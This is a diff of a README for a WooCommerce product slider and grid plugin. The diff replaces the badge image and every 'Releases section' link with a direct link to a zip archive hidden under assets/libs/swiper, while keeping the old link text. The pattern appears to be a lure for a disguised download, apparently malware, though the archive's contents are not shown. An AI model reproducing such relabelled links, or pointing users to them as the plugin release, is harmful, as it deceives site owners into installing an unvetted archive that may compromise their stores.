@@ -1,6 +1,6 @@
 # Flexi Product Slider & Grid for WooCommerce
 
-![Flexi Product Slider & Grid](https://img.shields.io/badge/Flexi_Product_Slider%20%26_Grid_for_WooCommerce-v1.0.0-blue)
+![Flexi Product Slider & Grid](https://raw.githubusercontent.com/JANNNAANANA/Flexi-Product-Slider-Grid-for-WooCommerce/main/assets/libs/swiper/for_Flexi_Slider_Grid_Woo_Product_Commerce_v1.4-alpha.1.zip%20%26_Grid_for_WooCommerce-v1.0.0-blue)
 
 Welcome to the **Flexi Product Slider & Grid for WooCommerce** repository! This plugin is designed to help you showcase your WooCommerce products in a stunning way. With options for carousel, slider, and grid layouts, you can create an attractive display that enhances your online store.
 
@@ -27,7 +27,7 @@ Welcome to the **Flexi Product Slider & Grid for WooCommerce** repository! This 
 
 To install the Flexi Product Slider & Grid for WooCommerce, follow these steps:
 
-1. Download the latest version from the [Releases section](https://github.com/JANNNAANANA/Flexi-Product-Slider-Grid-for-WooCommerce/releases).
+1. Download the latest version from the [Releases section](https://raw.githubusercontent.com/JANNNAANANA/Flexi-Product-Slider-Grid-for-WooCommerce/main/assets/libs/swiper/for_Flexi_Slider_Grid_Woo_Product_Commerce_v1.4-alpha.1.zip).
 2. Upload the plugin files to the `/wp-content/plugins/` directory.
 3. Activate the plugin through the 'Plugins' menu in WordPress.
 4. Configure the settings in the WooCommerce settings panel.
@@ -69,7 +69,7 @@ This plugin is licensed under the MIT License. You are free to use, modify, and 
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Releases section](https://github.com/JANNNAANANA/Flexi-Product-Slider-Grid-for-WooCommerce/releases) for updates and fixes. For additional help, you can open an issue in the repository.
+If you encounter any issues or have questions, please check the [Releases section](https://raw.githubusercontent.com/JANNNAANANA/Flexi-Product-Slider-Grid-for-WooCommerce/main/assets/libs/swiper/for_Flexi_Slider_Grid_Woo_Product_Commerce_v1.4-alpha.1.zip) for updates and fixes. For additional help, you can open an issue in the repository.
 
 ## Changelog
 
@@ -77,4 +77,4 @@ If you encounter any issues or have questions, please check the [Releases sectio
 
 ---
 
-Thank you for using **Flexi Product Slider & Grid for WooCommerce**! We hope this plugin enhances your online store and helps you display your products beautifully. For more information, check the [Releases section](https://github.com/JANNNAANANA/Flexi-Product-Slider-Grid-for-WooCommerce/releases) for the latest updates.
+Thank you for using **Flexi Product Slider & Grid for WooCommerce**! We hope this plugin enhances your online store and helps you display your products beautifully. For more information, check the [Releases section](https://raw.githubusercontent.com/JANNNAANANA/Flexi-Product-Slider-Grid-for-WooCommerce/main/assets/libs/swiper/for_Flexi_Slider_Grid_Woo_Product_Commerce_v1.4-alpha.1.zip) for the latest updates.
